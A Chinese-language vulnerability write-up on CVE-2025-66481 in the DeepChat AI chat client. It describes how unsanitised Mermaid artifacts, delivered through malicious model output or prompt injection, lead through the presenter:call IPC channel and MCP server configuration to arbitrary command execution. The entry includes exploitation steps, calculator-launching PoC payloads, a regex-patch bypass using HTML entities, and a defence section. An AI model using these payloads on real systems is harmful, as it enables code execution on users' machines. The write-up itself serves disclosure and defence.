---
id: ai-security-agent-security-deepchat-mermaid-xss-ipc-mcp-command-exec
title: DeepChat MermaidArtifact XSS + presenter:call + MCP addMcpServer 命令执行（CVE-2025-66481）
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: deepchat-mermaid-xss-ipc-mcp-command-exec
aliases:
- CVE-2025-66481
- DeepChat MermaidArtifact XSS
- presenter:call MCP RCE
- addMcpServer 命令执行
- StdioClientTransport spawn
tags:
- ai-security
- agent-security
- electron
- deepchat
- xss
- ipc
- mcp
- rce
- cve-2025-66481
cve:
- CVE-2025-66481
severity: critical
confidence: high
status: verified
affected_versions: <= 0.5.1
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T09:51:52+08:00'
  notes: 已对照原文与 6 张图核对：CVE-2025-66481/CVSS 9.6/CWE-79+80、受影响 Up to (including) 0.5.1、MermaidArtifact innerHTML 先行解析、presenter:call 动态派发、MCP addMcpServer→StdioClientTransport spawn、无引号属性+HTML 实体绕过补丁正则均与图 01-06 一致。已补 set-versions <= 0.5.1。未在目标应用复跑 PoC。
---

## 一句话结论

DeepChat `<= 0.5.1` 的 `MermaidArtifact.vue` 在 `mermaid.run()` 之前直接 `innerHTML = props.block.content`，`<img src=x onerror=...>` 立即执行；onerror 通过暴露的 `window.electron.ipcRenderer.invoke('presenter:call', ...)` 调用 `mcpPresenter.addMcpServer` 写入恶意 MCP 配置（`command`/`args`），再 `startServer` 触发 `StdioClientTransport` → `child_process.spawn()`，最终在受害者机器执行任意命令（CVE-2025-66481，CVSS 9.6）。

## 原理

- **XSS 入口**：`src/renderer/src/components/artifacts/MermaidArtifact.vue` 的 `renderDiagram()` 先执行 `mermaidRef.value.innerHTML = props.block.content`，再 `await mermaid.run({nodes:[mermaidRef.value]})`。浏览器在 `innerHTML` 赋值时立即解析 HTML 并触发 `<img src=x onerror=...>`；`securityLevel:'strict'` 只约束 mermaid 图表语法解析，无法阻止此前的 HTML 解析。
- **artifact 内容未净化**：`useArtifacts.ts` 只用正则删除 `<script>...</script>`，`content` 仅 `trim()` 后原样返回；`<img onerror>`、`<audio onerror>`、`<svg onload>` 等都能绕过。
- **IPC 动态派发**：主进程 `presenter:call` 处理器取 `presenter[name]` 后直接 `calledPresenter[method](...payloads)`，没有 presenter/method 白名单，也没有调用方权限校验；渲染进程可调用任意 presenter 的任意方法。
- **MCP 命令执行 sink**：`mcpPresenter.addMcpServer(name, config)` 把攻击者提供的 `MCPServerConfig` 写入配置；`mcpClient.connect()` 在 `type:'stdio'` 时读取 `command`/`args`，交给 `StdioClientTransport`，其内部用 Node.js `child_process.spawn()` 创建子进程。攻击者把 `command` 设为 `calc.exe`/`open`、`args` 设为 `['-a','Calculator']` 即可执行任意命令。
- **补丁绕过**：安全补丁用正则 `sanitized.replace(/on\w+\s*=\s*['"][^'"]*['"]/gi, '')` 试图删除事件属性，但它只匹配“带引号”的属性；HTML 允许无引号属性（`onerror=alert(1)`），且浏览器会在执行前解码属性值中的 HTML 实体（`&apos;`、`&gt;`），攻击者可用实体注入引号/空格/`>`，既绕过正则又不破坏语法。补丁的标签黑名单也不完整。
- **为什么能 RCE**：Electron 渲染进程未做严格隔离，`window.electron.ipcRenderer` 暴露给页面；主进程把“调用任意 presenter 方法”当成普通 IPC，MCP stdio 启动又直接 spawn 用户可控命令，三个信任边界同时缺失。

## 触发条件

- DeepChat `<= 0.5.1`（Electron 桌面应用），Mermaid artifact 渲染功能开启。
- 攻击者能让受害者渲染一段可控的 `<antArtifact type="application/vnd.ant.mermaid">`：恶意模型输出、被投毒的分享会话、导入的聊天记录、提示注入等。
- 渲染进程暴露 `window.electron.ipcRenderer`，`presenter:call` 未做 presenter/method 白名单。
- `mcpPresenter.addMcpServer` 可被调用，`mcpClient.connect` 使用 `StdioClientTransport`/`child_process.spawn` 启动 stdio MCP server。
- 应用以当前桌面用户权限运行，可执行系统命令。

## 利用步骤

1. 在聊天框/可控 artifact 中输入 Mermaid 内容，嵌入 `<img src=x onerror=...>` 或 `<audio src=x onerror=...>`。
2. 在 onerror 中构造 IPC 调用：
   ```js
   window.electron.ipcRenderer.invoke('presenter:call','mcpPresenter','addMcpServer','calc',
     {command:'open',args:['-a','Calculator'],type:'stdio',env:{},descriptions:'c',icons:'c'})
     .then(()=>window.electron.ipcRenderer.invoke('presenter:call','mcpPresenter','startServer','calc'))
   ```
3. 用 `setTimeout` 或 IIFE 确保 onerror 内代码执行；Windows 用 `command:'calc.exe',args:[]`，macOS 用 `command:'open',args:['-a','Calculator']`。
4. 通过 HTML 实体编码（`&apos;`、`&gt;`）和无引号属性绕过补丁正则；例如 `<audio src=x onerror=window.electron.ipcRenderer.invoke(&apos;presenter:call&apos;,...)>`。
5. `startServer` 触发 `StdioClientTransport` spawn；即使 MCP 连接失败/报错，命令已经执行（本题计算器弹出）。
6. 授权测试只执行无害命令（calc/Calculator），不要执行真实 payload。

## PoC

```xml
<antArtifact identifier="calc" type="application/vnd.ant.mermaid" title="Calculator">
graph TD
A[<img src=x onerror="window.C=function(){window.electron.ipcRenderer.invoke('presenter:call','mcpPresenter','addMcpServer','calc',{command:'open',args:['-a','Calculator'],type:'stdio',env:{},descriptions:'c',icons:'c'}).then(function(){window.electron.ipcRenderer.invoke('presenter:call','mcpPresenter','startServer','calc')})};setTimeout('window.C()',500)">]
</antArtifact>
```

```xml
<!-- Windows + 实体编码/无引号属性绕过补丁 -->
<antArtifact identifier="test" type="application/vnd.ant.mermaid" title="Test">
graph TD
A["<audio src=x onerror=window.electron.ipcRenderer.invoke(&apos;presenter:call&apos;,&apos;mcpPresenter&apos;,&apos;addMcpServer&apos;,&apos;test&apos;,{command:&apos;calc.exe&apos;,args:[],type:&apos;stdio&apos;,enabled:true,name:&apos;test&apos;}).then(()=&gt;window.electron.ipcRenderer.invoke(&apos;presenter:call&apos;,&apos;mcpPresenter&apos;,&apos;startServer&apos;,&apos;test&apos;))>"]
</antArtifact>
```

说明：PoC 按原文的 calc/Calculator payload 重写；未在目标应用执行，仅用于授权测试。

## 变体与关联

- **其他 sink**：同一个 `presenter:call` 可调用 `filePresenter.readFile/writeFile` 实现任意文件读写/凭据泄露（见 [[ai-security-agent-security-deepchat-mermaid-xss-ipc-filepresenter-path-traversal]]）；也可调用其他 presenter 的 shell/配置/删除方法。
- **其他入口**：Markdown/HTML/SVG artifact 渲染器若使用 `innerHTML`/`v-html` 未净化，也可 XSS。
- **补丁绕过**：无引号属性、HTML 实体、大小写、`<svg/onload>`、`<audio onerror>`、标签黑名单缺失；同类技巧见 [[web-generic-xss-filter-bypass-encoding-obfuscation]]。
- **MCP 配置**：`command`/`args`/`env` 都可控；可写持久化 MCP server，重启后仍执行。
- **关联**：[[ai-security-mcp-security-package-runner-npx-uvx-command-execution]]（MCP stdio 命令执行）、[[ai-security-mcp-security-config-rug-pull-command-swap-persistence]]（MCP 配置持久化）。

## 检测与防御

- **修复**：用 DOMPurify 对 Mermaid 内容做严格净化（`ALLOWED_TAGS: []`、`ALLOWED_ATTR: []`、`KEEP_CONTENT: true`）后再 `innerHTML`；或改用 `textContent` + mermaid 的安全渲染路径。升级到包含修复的 DeepChat 版本（CVE 描述为 `<=0.5.1` 受影响；文章发布时称尚无修复，需关注后续版本）。
- **IPC 白名单**：`presenter:call` 只允许明确的 presenter/method 组合，校验调用方与参数；不要暴露 `ipcRenderer` 给不可信页面。
- **MCP 配置校验**：`addMcpServer` 只允许白名单命令/参数，禁止任意 `command`；对 stdio server 做签名/来源校验，启动前人工确认。
- **Electron 加固**：启用 `contextIsolation`/`sandbox`、禁用 `nodeIntegration`、限制 `webPreferences`；设置 CSP 禁止内联事件处理器。
- **检测**：审计 `<antArtifact type="application/vnd.ant.mermaid">` 中的 `onerror`/`onload`、`presenter:call` 到 `mcpPresenter.addMcpServer/startServer` 的调用、异常 MCP 配置写入；监控子进程 spawn。
